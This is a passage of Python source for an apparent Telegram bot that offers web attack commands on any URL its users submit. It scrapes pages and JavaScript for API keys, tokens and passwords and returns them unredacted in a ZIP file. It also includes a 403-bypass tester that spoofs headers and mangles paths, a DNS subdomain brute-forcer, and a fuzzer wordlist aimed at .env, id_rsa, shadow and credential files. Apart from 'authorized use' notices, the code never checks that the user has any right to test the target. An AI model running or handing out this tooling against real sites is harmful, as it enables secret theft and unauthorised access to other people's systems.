    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/extract https://example.com`\n\n"
            "🔑 Scans HTML source + all external/inline JS files for:\n"
            "AWS keys, Stripe, JWT, GitHub tokens, Firebase configs,\n"
            "private keys, MongoDB URIs, passwords & more.\n\n"
            f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
            "📦 *Always exports a ZIP* containing:\n"
            "  • `index.html` — raw HTML source\n"
            "  • `js/` folder — all external JS files\n"
            "  • `inline_scripts/` — all inline `<script>` blocks\n"
            "  • `report.json` — full findings report\n"
            "  • `report.txt` — human-readable summary\n\n"
            "⚠️ _For authorized security research only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname

    msg = await update.effective_message.reply_text(
        f"🔑 Scanning `{domain}`...\n\n"
        "⬇️ Phase 1: Fetching HTML source\n"
        "📦 Phase 2: Downloading JS bundles\n"
        "🔍 Phase 3: Pattern matching\n"
        "🗜️ Phase 4: Building ZIP\n\n⏳",
        parse_mode='Markdown'
    )

    def _do_extract():
        session   = requests.Session()
        session.headers.update(_get_headers())

        resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        soup = BeautifulSoup(resp.text, 'html.parser')

        # ── Build source map ──────────────────────────────
        # sources = { filename_in_zip : content_str }
        sources        = {}
        source_origins = {}   # filename → original URL or tag info
        inline_idx     = 0
        js_idx         = 0

        # 1. Main HTML
        sources["index.html"]        = resp.text
        source_origins["index.html"] = url

        # 2. External JS + inline scripts
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                js_url    = urljoin(url, src) if not src.startswith('http') else src
                js_safe, _ = is_safe_url(js_url)
                if not js_safe:
                    continue
                try:
                    jr = session.get(js_url, timeout=12, verify=False)
                    if jr.status_code == 200 and jr.text.strip():
                        # Make a safe filename from the URL path
                        raw_name = src.split('/')[-1].split('?')[0][:60] or f"script_{js_idx}.js"
                        # Ensure .js extension
                        if not raw_name.endswith('.js'):
                            raw_name += '.js'
                        safe_name = re.sub(r'[^\w\.\-]', '_', raw_name)
                        fname     = f"js/{js_idx:03d}_{safe_name}"
                        sources[fname]        = jr.text
                        source_origins[fname] = js_url
                        js_idx += 1
                except Exception:
                    pass
            elif script.string and script.string.strip():
                content_str = script.string.strip()
                fname       = f"inline_scripts/inline_{inline_idx:03d}.js"
                sources[fname]        = content_str[:200000]   # cap at 200KB per inline
                source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
                inline_idx += 1

        # ── Scan all sources ──────────────────────────────
        findings  = []
        seen_keys = set()

        for fname, content in sources.items():
            file_findings = []
            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                for match in re.finditer(pattern, content):
                    val = match.group(0)
                    # Store FULL value in findings (goes into ZIP report, not Telegram message)
                    dedup_key = stype + val[:40]
                    if dedup_key in seen_keys:
                        continue
                    seen_keys.add(dedup_key)
                    # Redacted copy for Telegram display
                    if len(val) > 16:
                        redacted = val[:8] + "…" + val[-4:]
                    else:
                        redacted = val[:6] + "…"
                    file_findings.append({
                        "type":     stype,
                        "risk":     risk,
                        "value_redacted": redacted,
                        "value_full":     val,       # full value stored in ZIP only
                        "file":     fname,
                        "origin":   source_origins.get(fname, ""),
                        "line":     content[:match.start()].count('\n') + 1,
                    })
            findings.extend(file_findings)

        return sources, source_origins, findings

    try:
        sources, source_origins, findings = await asyncio.to_thread(_do_extract)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
        return

    # ── Sort findings by risk ────────────────────────────
    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
    findings.sort(key=lambda x: risk_order.get(x["risk"], 9))

    critical = sum(1 for f in findings if f["risk"] == "🔴")
    high     = sum(1 for f in findings if f["risk"] == "🟠")
    med      = sum(1 for f in findings if f["risk"] == "🟡")

    # ── Build report.txt (human readable, full values) ──
    txt_lines = [
        f"=" * 60,
        f"  EXTRACT REPORT — {domain}",
        f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"  URL: {url}",
        f"=" * 60,
        f"",
        f"SUMMARY",
        f"-------",
        f"Sources scanned : {len(sources)} files",
        f"Patterns checked: {len(_SECRET_PATTERNS)}",
        f"Findings total  : {len(findings)}",
        f"  Critical (🔴) : {critical}",
        f"  High     (🟠) : {high}",
        f"  Medium   (🟡) : {med}",
        f"",
        f"FILES SCANNED",
        f"-------------",
    ]
    for fname, origin in source_origins.items():
        size_kb = len(sources[fname].encode('utf-8', errors='replace')) / 1024
        txt_lines.append(f"  [{size_kb:6.1f} KB]  {fname}  ←  {origin[:80]}")

    txt_lines += ["", "FINDINGS", "--------"]
    if findings:
        for i, f in enumerate(findings, 1):
            txt_lines += [
                f"",
                f"[{i:03d}] {f['risk']} {f['type']}",
                f"  File  : {f['file']}",
                f"  Line  : {f['line']}",
                f"  Origin: {f['origin'][:80]}",
                f"  Value : {f['value_full']}",    # ← FULL value in ZIP file
            ]
    else:
        txt_lines.append("  No secrets found.")

    txt_lines += [
        "",
        "=" * 60,
        "  ⚠  This report contains unredacted values.",
        "  For authorized security research only.",
        "=" * 60,
    ]
    report_txt = "\n".join(txt_lines)

    # ── Build report.json ────────────────────────────────
    report_json = json.dumps({
        "domain":          domain,
        "url":             url,
        "scanned_at":      datetime.now().isoformat(),
        "files_scanned":   list(source_origins.values()),
        "pattern_count":   len(_SECRET_PATTERNS),
        "findings_count":  len(findings),
        "summary":         {"critical": critical, "high": high, "medium": med},
        "findings": [{
            "type":   f["type"],
            "risk":   f["risk"],
            "value":  f["value_full"],
            "file":   f["file"],
            "line":   f["line"],
            "origin": f["origin"],
        } for f in findings],
        "files": {fname: source_origins[fname] for fname in sources},
    }, ensure_ascii=False, indent=2)

    # ── Build ZIP in memory ──────────────────────────────
    await msg.edit_text(
        f"🗜️ Building ZIP for `{domain}`...\n"
        f"📂 `{len(sources)}` source files + reports",
        parse_mode='Markdown'
    )

    import io
    zip_buffer = io.BytesIO()
    safe_domain = re.sub(r'[^\w\-]', '_', domain)
    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name    = f"extract_{safe_domain}_{ts}.zip"

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Source files
        for fname, content in sources.items():
            zf.writestr(f"sources/{fname}", content.encode('utf-8', errors='replace'))
        # Reports
        zf.writestr("report.txt",  report_txt.encode('utf-8'))
        zf.writestr("report.json", report_json.encode('utf-8'))
        # README
        _js_count     = sum(1 for f in sources if f.startswith("js/"))
        _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
        readme = (
            f"EXTRACT SCAN — {domain}\n"
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"CONTENTS\n"
            f"  sources/index.html           — Raw HTML page\n"
            f"  sources/js/                  — External JS files ({_js_count} files)\n"
            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
            f"  report.txt                   — Human-readable findings (FULL values)\n"
            f"  report.json                  — Machine-readable JSON report\n\n"
            f"FINDINGS: {len(findings)} total  "
            f"(Critical:{critical} High:{high} Medium:{med})\n"
        )
        zf.writestr("README.txt", readme.encode('utf-8'))

    zip_buffer.seek(0)
    zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024

    # ── Send Telegram summary (redacted) ────────────────
    if findings:
        tg_lines = [
            f"🚨 *{len(findings)} Secret(s) Found — `{domain}`*",
            f"🔴 Critical: `{critical}` | 🟠 High: `{high}` | 🟡 Medium: `{med}`",
            f"📂 Scanned: `{len(sources)}` files\n",
        ]
        for f in findings[:15]:
            tg_lines.append(
                f"{f['risk']} *{f['type']}*\n"
                f"   Value: `{f['value_redacted']}`\n"
                f"   File:  `{f['file']}`  Line `{f['line']}`"
            )
        if len(findings) > 15:
            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
        tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
    else:
        tg_lines = [
            f"✅ *No Secrets Found*",
            f"🔗 `{domain}`",
            f"📂 Sources scanned: `{len(sources)}` files",
            f"🔍 Patterns checked: `{len(_SECRET_PATTERNS)}`",
            f"\n_ZIP contains all raw source files for manual review._",
        ]

    tg_text = "\n".join(tg_lines)
    try:
        if len(tg_text) > 4000:
            await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
        else:
            await msg.edit_text(tg_text, parse_mode='Markdown')
    except Exception:
        pass

    # ── Send ZIP ─────────────────────────────────────────
    cap = (
        f"📦 *Extract ZIP — `{domain}`*\n"
        f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
        f"🔴`{critical}` 🟠`{high}` 🟡`{med}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
        f"📄 `report.txt` — full unredacted values\n"
        f"📋 `report.json` — machine-readable\n"
        f"📁 `sources/` — raw HTML + JS files"
    )
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buffer,
            filename=zip_name,
            caption=cap,
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ ZIP send error: `{type(e).__name__}: {str(e)[:60]}`",
            parse_mode='Markdown'
        )



# ══════════════════════════════════════════════════
# 🔓  /bypass403 — 403 Forbidden Bypass Tester
# ══════════════════════════════════════════════════

_BYPASS_HEADERS = [
    {"X-Original-URL":             "{path}"},
    {"X-Rewrite-URL":              "{path}"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Forwarded-For":            "localhost"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Remote-Addr":              "127.0.0.1"},
    {"X-Host":                     "localhost"},
    {"X-Real-IP":                  "127.0.0.1"},
    {"X-ProxyUser-Ip":             "127.0.0.1"},
    {"Referer":                    "{url}"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"True-Client-IP":             "127.0.0.1"},
    {"Client-IP":                  "127.0.0.1"},
    {"CF-Connecting-IP":           "127.0.0.1"},
    {"Forwarded":                  "for=127.0.0.1"},
    {"X-Frame-Options":            "Allow"},
    {"X-WAF-Bypass":               "1"},
    {"X-Bypass":                   "1"},
    {"Authorization":              "Bearer null"},
]

_BYPASS_PATH_VARIANTS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "/{path_no_slash}%20",
    "/{path_no_slash}%09",
    "/{path_no_slash}%00",
    "/{path_no_slash}..;/",
    "/{path_no_slash};/",
    "/{path_no_slash}?",
    "//{path_no_slash}",
    "/{path_upper}",
    "/{path_lower}",
    "{path_dot_slash}",
]

_BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

def _bypass_sync(url: str) -> list:
    """Run all 403 bypass techniques against a URL."""
    parsed     = urlparse(url)
    path       = parsed.path or "/"
    path_clean = path.lstrip("/")
    base       = f"{parsed.scheme}://{parsed.netloc}"
    results    = []


    def _probe(test_url: str, extra_headers: dict = None, method: str = "GET",
               label: str = "") -> dict | None:
        try:
            h = dict(_get_headers())
            if extra_headers:
                # Resolve {path} / {url} placeholders in header values
                for k, v in extra_headers.items():
                    v = v.replace("{path}", path).replace("{url}", url)
                    h[k] = v
            r = requests.request(
                method, test_url, headers=h,
                timeout=8, verify=False,
                allow_redirects=False,
                proxies=proxy_manager.get_proxy()
            )
            return {
                "url":    test_url,
                "method": method,
                "status": r.status_code,
                "size":   len(r.content),
                "label":  label,
                "headers": dict(r.headers),
            }
        except Exception:
            return None

    # ── Baseline: confirm it's actually 403 ────────
    baseline = _probe(url, label="baseline")
    if not baseline:
        return []
    results.append({**baseline, "technique": "Baseline"})
    baseline_status = baseline["status"]
    baseline_size   = baseline["size"]

    def _is_bypass(r: dict) -> bool:
        if not r:
            return False
        st = r["status"]
        # Success: 200/201/204/301/302 when baseline was 403/401
        if baseline_status in (403, 401):
            if st in (200, 201, 204, 301, 302):
                return True
            # Different size even on 403 might indicate WAF bypass
            if st == baseline_status and abs(r["size"] - baseline_size) > 500:
                return True
        return False

    # ── Header manipulation ──────────────────────────
    for hdr_template in _BYPASS_HEADERS:
        hdrs = {}
        for k, v in hdr_template.items():
            hdrs[k] = v.replace("{path}", path).replace("{url}", url)
        label = "Header: " + ", ".join(f"{k}: {v}" for k, v in hdr_template.items())
        r = _probe(url, hdrs, label=label)
        if r:
            r["technique"] = "header_manipulation"
            results.append(r)

    # ── Path variants ────────────────────────────────
    path_variants = [
        (f"{base}{path}/",                    "path/"),
        (f"{base}{path}//",                   "path//"),
        (f"{base}{path}/.",                   "path/."),
        (f"{base}/{path_clean}%20",           "url_encode_space"),
        (f"{base}/{path_clean}%09",           "url_encode_tab"),
        (f"{base}/{path_clean}%00",           "null_byte"),
        (f"{base}/{path_clean}..;/",          "path_dotdot"),
        (f"{base}/{path_clean};/",            "semicolon"),
        (f"{base}//{path_clean}",             "double_slash"),
        (f"{base}/{path_clean.upper()}",      "uppercase"),
        (f"{base}/{path_clean.lower()}",      "lowercase"),
        (f"{base}/{path_clean}?anything",     "query_append"),
        (f"{base}/{path_clean}#",             "fragment"),
        (f"{base}/./{ path_clean}",           "dot_prefix"),
        (f"{base}/{path_clean}/..",           "dotdot_suffix"),
    ]
    for test_url, label in path_variants:
        safe_ok, _ = is_safe_url(test_url)
        if not safe_ok:
            continue
        r = _probe(test_url, label=label)
        if r:
            r["technique"] = "path_variant"
            results.append(r)

    # ── HTTP method override ─────────────────────────
    for method in _BYPASS_METHODS:
        r = _probe(url, method=method, label=f"Method: {method}")
        if r:
            r["technique"] = "method_override"
            results.append(r)

    # ── Method override via header ───────────────────
    for method in ["GET", "POST", "PUT", "DELETE"]:
        r = _probe(url,
                   extra_headers={"X-HTTP-Method-Override": method,
                                  "X-Method-Override": method},
                   label=f"X-HTTP-Method-Override: {method}")
        if r:
            r["technique"] = "method_override_header"
            results.append(r)

    # ── Content-Type tricks ──────────────────────────
    for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
        r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
                   method="POST", label=f"POST Content-Type: {ct}")
        if r:
            r["technique"] = "content_type"
            results.append(r)

    # Tag bypasses
    for res in results:
        res["bypassed"] = _is_bypass(res)

    return results


async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
            "🔓 *Tests 50+ bypass techniques:*\n"
            "  • Header manipulation (X-Original-URL, X-Forwarded-For...)\n"
            "  • Path normalization variants (/admin/, /ADMIN, /admin/..)\n"
            "  • HTTP method override (POST, PUT, OPTIONS...)\n"
            "  • X-HTTP-Method-Override header\n"
            "  • Content-Type tricks\n"
            "  • URL encoding bypass (%20, %09, %00)\n\n"
            "⚠️ _For authorized security testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    path   = urlparse(url).path or "/"

    msg = await update.effective_message.reply_text(
        f"🔓 *Bypass Testing — `{domain}`*\n"
        f"Path: `{path}`\n\n"
        "Running 50+ bypass techniques...\n⏳",
        parse_mode='Markdown'
    )

    try:
        results = await asyncio.to_thread(_bypass_sync, url)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    baseline    = next((r for r in results if r.get("technique") == "Baseline"), None)
    baseline_st = baseline["status"] if baseline else "?"
    bypasses    = [r for r in results if r.get("bypassed")]
    tested      = len(results) - 1   # exclude baseline

    lines = [
        f"🔓 *Bypass Results — `{path}`*",
        f"🌐 `{domain}` | Baseline: `{baseline_st}`",
        f"🧪 Tested: `{tested}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
    ]

    if not bypasses:
        lines.append("🔒 No bypasses found — endpoint is well-protected.")
    else:
        lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
        for b in bypasses[:15]:
            st_icon = "✅" if b["status"] in (200,201,204) else "↪️"
            lines.append(
                f"  {st_icon} `{b['status']}` [{b['method']}] `{b['label'][:55]}`"
            )
            if b["status"] in (301, 302):
                loc = b.get("headers", {}).get("Location", "")
                if loc:
                    lines.append(f"      → `{loc[:60]}`")

    # ── Summary by technique type ────────────────────
    tech_counts = {}
    for b in bypasses:
        t = b.get("technique", "other")
        tech_counts[t] = tech_counts.get(t, 0) + 1
    if tech_counts:
        lines.append("\n*By technique:*")
        for t, c in sorted(tech_counts.items(), key=lambda x: -x[1]):
            lines.append(f"  • `{t}`: {c}")

    lines.append("\n⚠️ _Authorized testing only._")

    # ── Export JSON if bypasses found ────────────────
    if bypasses:
        import io
        report = json.dumps({
            "url": url, "baseline_status": baseline_st,
            "tested": tested, "bypasses_found": len(bypasses),
            "bypass_details": [{
                "label": b["label"], "method": b["method"],
                "status": b["status"], "size": b["size"],
                "technique": b["technique"],
                "location": b.get("headers",{}).get("Location",""),
            } for b in bypasses],
            "all_results": [{
                "label": r["label"], "method": r["method"],
                "status": r["status"], "size": r["size"],
            } for r in results],
        }, indent=2)
        buf = io.BytesIO(report.encode())
        try:
            await msg.edit_text("\n".join(lines), parse_mode='Markdown')
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=buf,
                filename=f"bypass403_{domain}_{ts}.json",
                caption=f"🔓 Bypass report — `{domain}` — `{len(bypasses)}` bypasses",
                parse_mode='Markdown'
            )
        except Exception:
            await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')
    else:
        await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 📡  /subdomains — Advanced Subdomain Enumerator
# ══════════════════════════════════════════════════

_SUBDOMAIN_WORDLIST = [
    "www","mail","smtp","pop","imap","ftp","sftp","ssh","vpn","remote",
    "api","api2","api3","dev","dev2","staging","stage","beta","alpha","test",
    "admin","administrator","portal","panel","dashboard","manage","manager",
    "blog","shop","store","pay","payment","billing","invoice","checkout",
    "app","apps","mobile","m","wap","static","assets","cdn","media","img",
    "images","uploads","files","docs","docs2","help","support","kb","wiki",
    "status","monitor","grafana","prometheus","kibana","elastic","jenkins",
    "git","gitlab","github","bitbucket","jira","confluence","redmine",
    "internal","intranet","corp","corporate","private","secure","ssl",
    "login","auth","sso","oauth","id","identity","account","accounts",
    "db","database","mysql","postgres","redis","mongo","memcache","cache",
    "backup","old","legacy","v1","v2","v3","new","next","preview",
    "sandbox","demo","lab","labs","research","data","analytics","stats",
    "mx","mx1","mx2","ns","ns1","ns2","ns3","dns","dns1","dns2",
    "web","web1","web2","web3","server","server1","host","node","node1",
    "cloud","aws","azure","gcp","heroku","k8s","kubernetes","docker",
    "ci","cd","build","deploy","ops","devops","infra","infrastructure",
    "us","eu","asia","uk","au","jp","de","fr","ca","in","br",
    "prod","production","live","uat","qa","qas","rc","release",
    "autodiscover","autoconfig","cpanel","whm","plesk","webmail",
    "forum","forums","community","social","chat","slack","meet",
    "careers","jobs","press","news","events","about","contact",
]

def _subdomains_sync(domain: str, progress_q: list) -> dict:
    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
    results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
    found_all    = set()


    # ── Source 1: crt.sh (Certificate Transparency) ─
    progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, headers={"Accept": "application/json"}
        )
        if r.status_code == 200:
            seen = set()
            for entry in r.json():
                names = entry.get("name_value", "").split("\n")
                for name in names:
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        sub = name.replace(f".{domain}", "").replace(domain, "")
                        if sub and sub not in seen and len(sub) < 60:
                            seen.add(sub)
                            results["crtsh"].append(name)
                            found_all.add(name)
            progress_q.append(f"✅ crt.sh: `{len(results['crtsh'])}` subdomains found")
    except Exception as e:
        results["errors"].append(f"crt.sh: {e}")

    # ── Source 2: HackerTarget API (free) ────────────
    progress_q.append("🔍 Querying HackerTarget API...")
    try:
        r = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=12
        )
        if r.status_code == 200 and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                if "," in line:
                    hostname = line.split(",")[0].strip().lower()
                    if hostname.endswith(f".{domain}"):
                        found_all.add(hostname)
                        results["hackertarget"].append(hostname)
            progress_q.append(f"✅ HackerTarget: `{len(results['hackertarget'])}` found")
    except Exception as e:
        results["errors"].append(f"HackerTarget: {e}")

    # ── Source 3: DNS Brute-force ────────────────────
    progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
    live_subs  = []
    wildcard_ip = None

    # Wildcard detection
    try:
        wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
        wildcard_ip = wc_ip
        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`) — filtering...")
    except socket.gaierror:
        pass

    def _check_sub(word):
        hostname = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            # Filter wildcard
            if wildcard_ip and ip == wildcard_ip:
                return None
            return (hostname, ip)
        except socket.gaierror:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
        done = 0
        for fut in concurrent.futures.as_completed(futs, timeout=45):
            done += 1
            if done % 50 == 0:
                progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
            try:
                res = fut.result(timeout=4)
                if res:
                    hostname, ip = res
                    live_subs.append({"hostname": hostname, "ip": ip})
                    found_all.add(hostname)
            except Exception:
                pass

    results["bruteforce"] = live_subs
    progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")

    # ── Deduplicate and resolve all found ────────────
    all_unique = sorted(found_all)
    resolved   = {}
    for h in all_unique[:100]:
        try:
            resolved[h] = socket.gethostbyname(h)
        except Exception:
            resolved[h] = "unresolved"

    results["all_unique"]    = all_unique
    results["resolved"]      = resolved
    results["total_unique"]  = len(all_unique)
    results["wildcard_detected"] = wildcard_ip is not None

    return results


async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/subdomains <domain> — Advanced subdomain enumeration"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/subdomains example.com`\n\n"
            "📡 *3 sources combined:*\n"
            "  ① crt.sh — Certificate Transparency logs (passive)\n"
            "  ② HackerTarget API — public dataset\n"
            f"  ③ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
            "🛡 Wildcard DNS auto-detection & filtering\n"
            "📦 Exports full list as `.txt` + `.json` files",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()

    # Basic domain validation
    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
        await update.effective_message.reply_text("❌ Invalid domain format. Example: `example.com`", parse_mode='Markdown')
        return

    # SSRF: block private IPs for the apex domain
    try:
        apex_ip = socket.gethostbyname(raw)
        if not _is_safe_ip(apex_ip):
            await update.effective_message.reply_text(f"🚫 Private IP blocked: `{apex_ip}`", parse_mode='Markdown')
            return
    except socket.gaierror:
        pass  # domain may not have A record — still continue

    msg = await update.effective_message.reply_text(
        f"📡 *Subdomain Enumeration — `{raw}`*\n\n"
        f"① crt.sh (CT logs)\n② HackerTarget API\n"
        f"③ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📡 *Enumerating `{raw}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_subdomains_sync, raw, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    total    = data["total_unique"]
    resolved = data["resolved"]
    crtsh_c  = len(data["crtsh"])
    ht_c     = len(data["hackertarget"])
    bf_c     = len(data["bruteforce"])
    wc       = data["wildcard_detected"]

    lines = [
        f"📡 *Subdomain Enumeration — `{raw}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🔎 Total unique: `{total}`",
        f"  crt.sh:       `{crtsh_c}`",
        f"  HackerTarget: `{ht_c}`",
        f"  Brute-force:  `{bf_c}` live",
        f"{'⚠️ Wildcard DNS detected & filtered' if wc else '✅ No wildcard DNS'}\n",
    ]

    # Show top results
    if data["all_unique"]:
        lines.append("*Found Subdomains:*")
        for h in data["all_unique"][:30]:
            ip = resolved.get(h, "?")
            # Flag interesting ones
            flag = ""
            for keyword in ("dev","staging","admin","internal","test","beta","old","backup","api"):
                if keyword in h:
                    flag = " 🔴"
                    break
            lines.append(f"  `{h}` → `{ip}`{flag}")
        if total > 30:
            lines.append(f"  _…and {total-30} more in export file_")

    lines.append("\n📦 _Full list exported below_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── Export files ──────────────────────────────────
    import io
    txt_content  = "\n".join(
        f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
    )
    json_content = json.dumps({
        "domain": raw, "scanned_at": datetime.now().isoformat(),
        "total_unique": total, "wildcard_detected": wc,
        "sources": {"crtsh": crtsh_c, "hackertarget": ht_c, "bruteforce": bf_c},
        "subdomains": [{
            "hostname": h, "ip": resolved.get(h,"?"),
            "interesting": any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))
        } for h in data["all_unique"]],
    }, indent=2)

    import zipfile as _zf2
    zip_buf = io.BytesIO()
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d  = re.sub(r'[^\w\-]', '_', raw)
    with _zf2.ZipFile(zip_buf, 'w', _zf2.ZIP_DEFLATED) as zf:
        zf.writestr("subdomains.txt",  txt_content.encode())
        zf.writestr("subdomains.json", json_content.encode())
        interesting = [h for h in data["all_unique"]
                       if any(k in h for k in ("dev","staging","admin","internal","test","backup","api"))]
        zf.writestr("interesting.txt", "\n".join(interesting).encode())
    zip_buf.seek(0)

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=zip_buf,
        filename=f"subdomains_{safe_d}_{ts}.zip",
        caption=(
            f"📡 *Subdomains — `{raw}`*\n"
            f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
            f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
# ══════════════════════════════════════════════════

_FUZZ_PATHS = [
    # Hidden admin / debug
    "admin","administrator","admin.php","admin/login","login","login.php",
    "dashboard","panel","control","manage","manager","cpanel","wp-admin",
    "debug","test","testing","dev","development","staging","beta","old",
    # Backup files
    "backup","backup.zip","backup.sql","dump.sql","db.sql","site.zip",
    "index.php.bak","index.html.bak","config.php.bak",".env",".env.bak",
    ".env.example",".env.local",".env.production",
    # Info disclosure
    "info.php","phpinfo.php","server-info","server-status","status",
    "health","ping","version","api/version","build","trace",
    # Source leaks
    ".git","git/config",".svn","web.config",".htaccess","crossdomain.xml",
    "robots.txt","sitemap.xml","humans.txt","security.txt",
    ".well-known/security.txt","readme.md","README.md","CHANGELOG.md",
    # CMS paths
    "wp-login.php","wp-config.php","xmlrpc.php","wp-json",
    "joomla","wp-content/debug.log","config/database.yml",
    "configuration.php","config.php","config.yml","config.json",
    "settings.py","database.yml","credentials.json","secrets.json",
    # API
    "api","api/v1","api/v2","api/v3","api/users","api/admin","graphql",
    "swagger.json","openapi.json","api-docs","redoc","swagger-ui.html",
    # Logs
    "error.log","access.log","debug.log","app.log","laravel.log",
    "storage/logs/laravel.log","logs/error.log","var/log/app.log",
    # Common uploads/files
    "uploads","files","static","assets","media","public",
    "download","downloads","export","exports","report","reports",
    # Framework specific
    "actuator","actuator/health","actuator/env","actuator/mappings",
    "metrics","prometheus","grafana","kibana","phpmyadmin","adminer.php",
    # Common hidden files
    "id_rsa","id_rsa.pub","authorized_keys","known_hosts",
    "passwd","shadow","hosts","resolv.conf",
]

_FUZZ_PARAMS = [
    "id","user","username","email","file","path","page","url","redirect",
    "next","return","callback","debug","test","admin","token","key","secret",
